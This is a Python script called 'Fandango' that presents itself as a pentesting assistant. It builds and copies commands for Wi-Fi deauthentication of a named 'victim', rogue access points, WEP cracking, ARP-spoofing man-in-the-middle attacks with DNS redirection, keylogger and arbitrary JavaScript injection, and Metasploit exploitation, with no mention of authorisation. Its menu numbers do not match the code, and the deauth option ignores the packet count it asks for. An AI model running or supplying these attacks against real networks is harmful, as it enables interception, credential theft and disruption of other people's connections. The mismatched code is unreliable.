import time
import pyperclip
from colorama import Fore, Back, Style 
import itertools, sys
import time
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
from googlesearch import search
import webbrowser
from tabulate import tabulate

import os

cmd = 'mode 150,150'
os.system(cmd)



from os import system, name
  
# import sleep to show output for some time period
from time import sleep
  
# define our clear function
def clear():
  
    # for windows
    if name == 'nt':
        _ = system('cls')
  
    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')




spinner = itertools.cycle(["Proccessing...-", "Proccessing.../", "Proccessing...|", "Proccessing...\\"])
def Spinner(t):
    delay=t 
    close_time=time.time()+delay
    while True:
        time.sleep(0.2)
        sys.stdout.write(next(spinner))   
        sys.stdout.flush()                
        sys.stdout.write('\r')            
       
        if time.time()>close_time:
            print("\n")
            return


interface=" wlan0mon"
print("███████╗░█████╗░███╗░░██╗██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░")
print("██╔════╝██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗")
print("█████╗░░███████║██╔██╗██║██║░░██║███████║██╔██╗██║██║░░██╗░██║░░██║")
print("██╔══╝░░██╔══██║██║╚████║██║░░██║██╔══██║██║╚████║██║░░╚██╗██║░░██║")
print("██║░░░░░██║░░██║██║░╚███║██████╔╝██║░░██║██║░╚███║╚██████╔╝╚█████╔╝")
print("╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚════╝░")
print("")
print("Advanced Pentesting Assistance")
print("")


print(Fore.YELLOW+"Enter interface (wlan0 for wireless and eth0 for wired connections most of the time) ")
interface= input("> ")
Spinner(1)

print(Fore.YELLOW+"You can use 0 to open up the menu")
Spinner(3)
clear()

def Func(*argv):  
    for arg in argv: 
        pyperclip.copy(arg)
        Spinner(1.75)
        print(arg)
menu=[
["[0] Menu",""],
[Fore.LIGHTYELLOW_EX+"[1] Inspect nearby networks"," BSSID info - Channel info - Encryption method info"],
["[2] Inspect specific network","Connected device's BSSID's - Creates .cap file for detailed info"],
[Fore.WHITE+"",""],

[Fore.LIGHTBLACK_EX+"[3] Perform deauth attack","Disconnet user from network"],
["[4] Perform fake acces point attack","use mana-toolkit to broadcast internet -- run wireshark to analyze"],
["[5] Perform wep crack","crack a wep protected network -- use .cap file created by running command 2"],
[Fore.WHITE+"",""],

[Fore.LIGHTMAGENTA_EX+"[6] Run wireshark","analyze networks"],
["[7] Run Metasploit Framework","Exploit port vulnerabilities"],
["[8] Run netdiscover",  "Connected device's IP and MAC adresses"],
[Fore.WHITE+"",""],

[Fore.WHITE+"[9] Create wordlist","create a possible passwords list by generating passwords based on parameters"],

[Fore.WHITE+"",""],
[Fore.CYAN+"[10] Nmap ping scan","Network information including MAC adresses"],
[Fore.CYAN+"[11] Nmap quick scan","Network information incuding MAC adresses and open ports"],
[Fore.CYAN+"[12] Nmap quick scan plus"," Network information including MAC adresses, open ports, port versions and services"],
[Fore.CYAN+"[13] Nmap intense scan","Network information including MAC adresses, open ports, port versions, services and vulnerabilites"],
[Fore.WHITE+"",""],

[Fore.LIGHTRED_EX+"[14] Perform MITM attack with MITM Framework","Trick the router and the target by forwarding network traffic trough your device"],
["[15] Change victim's DNS settings with MITMF","Redirect victim to unintended ip adresses"],
["[16] Capture screenshots with MITMF",""],
["[17] Inject keylogger with MITMF","Track pressed keys on the keyboard"],
["[18] Inject javascript code with MITMF","Run any code on the target computer when a website is loaded"],
[Fore.WHITE+"",""],



[Fore.WHITE+"",""],
[Fore.MAGENTA+"[19] Install mana-toolkit",""+Fore.WHITE],
[Fore.MAGENTA+"[20] Install MITMF",""+Fore.WHITE],
[Fore.MAGENTA+"[22] Install veil with Git",""+Fore.WHITE],
[Fore.WHITE+"",""],
[Fore.WHITE+"",""],

]


def Menu():
    print("")
    print("█▀▄▀█ █▀▀ █▄░█ █░█")
    print("█░▀░█ ██▄ █░▀█ █▄█\n")
    print(Fore.YELLOW+""+Fore.WHITE+tabulate(menu, headers=[Fore.YELLOW+"  Command","    Description"+Fore.WHITE]))



while True:
    command= input("Fandango>")
    if(command=="0"):
        Menu()
    elif (command=="1"):
        Func("airodump-ng"+interface)
    elif (command=="2"):
        x=input("-Enter channel")
        y=input("-Enter BSSID")
        z=input("-Enter file name")
        Func("airodump-ng --channel "+x+" --bssid "+y+" --write "+z+interface)
    elif (command=="3"):
        x=input("-Enter router's BSSID")
        y=input("-Enter victim's BSSID")
        z=input("-Enter number of packets to send -- more packages mean more downtime -- around 10 is ideal for short time disconnection")
        Func("aireplay-ng --deauth 10000 -a "+x+" -c "+y+interface)
    elif(command=="4"):
        Func("apt-get install mana-toolkit")
    elif(command=="5"):
        print(Fore.RED+"You will be using your wifi card to broadcast the network")
        print(Fore.RED+"-- Make sure you only have a wired connection on your VM -- Connect through NatNetwork")
        print(Fore.RED+"Check your hostpad-mana.conf file, change the ssid as the name of your broadcast")
        print(Fore.RED+"Check your start-nat-simple.sh file")
        Func("bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh")
    elif(command=="6"):
        x=input("-Enter file name")
        Func("aircrack-ng "+x)
    elif(command=="7"):
        Func("wireshark")
    elif (command=="8"):
        x=input("-Enter minimum number of characters")
        y=input("-Enter maximum number of characters")
        z=input("-Enter characters to use -- do not seperate with space")
        b=input("-Enter file name")
        command=input("Do you want to include a pattern (y/n)")
        if command=="y":
            a=input("-Enter a pattern -- optional -- use @ symbols to represent unknown character. -- example -- a@@@b would generate 5 character words starting with a and ending with b")
            Func("crunch "+x+" "+y+" "+z+" -t "+a+" -o "+b)
        elif command=="n":
            Func("crunch "+x+" "+y+" "+z+" -o "+b)
    elif(command=="9"):
        x=input("-Enter inet value")
        parts=x.split(".")
        Func("netdiscover -i"+interface+" -r "+parts[0]+"."+parts[1]+"."+parts[2]+".0/24")
    elif(command =="10"):
        x=input("-Enter inet value")
        parts=x.split(".")
        Func("nmap -sn "+parts[0]+"."+parts[1]+"."+parts[2]+".0/24")
    elif(command=="11"):
        x=input("-Enter inet value")
        parts=x.split(".")
        Func("nmap -T4 -F "+parts[0]+"."+parts[1]+"."+parts[2]+".0/24")
    elif(command=="12"):
        x=input("-Enter inet value")
        parts=x.split(".")
        Func("nmap -sV -T4 -O -F --version-light "+parts[0]+"."+parts[1]+"."+parts[2]+".0/24")
    elif(command=="13"):
        x=input("-Enter router's IP adress")
        y=input("-Enter victim's IP adress")
        Func("mitmf --arp --spoof --gateway "+x+" --target "+y+" -i"+interface)
    elif(command=="14"):
        Func("apt-get install mitmf")
    elif (command=="15"):
        x=input("-Enter router's IP adress")
        y=input("-Enter victim's IP adress")
        z=input("Enter the website to be directed from")
        w=("Enter the ip to be directed")
        Func("mitmf --arp --spoof --gateway "+x+" --target "+y+" -i"+interface+" --dns")
        print(Fore.RED+"Check your etc-mitmf-mitmf.conf file -- locate [[A]] -- add *."+z+"="+w+" under it")
    elif(command=="16"):
        x=input("-Enter router's IP adress")
        y=input("-Enter victim's IP adress")
        z=input("Enter how many seconds you want between captures")
        Func("mitmf --arp --spoof --gateway "+x+" --target "+y+" -i"+interface+" --screen --interval "+z)
        print(Fore.RED+"In case you get an error, run the command pip install Twisted==15.5.0")
        print(Fore.RED+"View files at computer-var-log-mtmf")
    elif(command=="17"):
        x=input("-Enter router's IP adress")
        y=input("-Enter victim's IP adress")
        Func("mitmf --arp --spoof --gateway "+x+" --target "+y+" -i"+interface+" --jskeylogger")
    elif(command=="18"):
        x=input("-Enter router's IP adress")
        y=input("-Enter victim's IP adress")
        z=input("Enter javascript code")
        Func("mitmf --arp --spoof --gateway "+x+" --target "+y+" -i"+interface+" --inject --js-payload \""+z+"\"")
    elif(command=="19"):
        x=input("-Enter victim's IP adress")
        Func("nmap -T4 -A -v "+x)
    elif(command=="20"):
        print(Fore.CYAN+"Using Metasploit Community is recommended")
        x=input("Enter port version")
        print(Fore.RED+"This will make a google search and load the first result do you want to continue?")
        input()
        query = x+" expolit rapid7"
        for j in search(query, tld="co.in", num=1, stop=1, pause=2):
            url=j
        webbrowser.open(url)
        print(Fore.CYAN+"Copy one of the modules from the website loaded and run it on the msf console. -- Or follow the instructions on the page")
        print("==================================================")
        print(Fore.LIGHTBLUE_EX+"0-Open msf console")
        print(Fore.LIGHTBLUE_EX+"1-Set target after running the module")
        print(Fore.LIGHTBLUE_EX+"2-View module settings")
        print(Fore.LIGHTBLUE_EX+"3-Exploit it")
        print(Fore.RED+"Press enter to exit")
        print("==================================================")
        while(True):
            x=input()
            if (x=="1"):
                y=input("Enter victim's IP adress")
                Func("set RHOST "+y)
            elif(x=="0"):
                Func("msfconsole")
            elif(x=="2"):
                Func("show options")
            elif(x=="3"):
                Func("exploit")
            else:
                break
    elif(command=="21"):
        Func("git clone https://github.com/Veil-Framework/Veil.git")
    elif (command=="22"):
        Func("sudo -apt-get -y install git")
        input("Press enter to continue the process ")
        Func("cd Veil/")
        input("Press enter to continue the process ")
        Func("./config/setup.sh --force --silent")
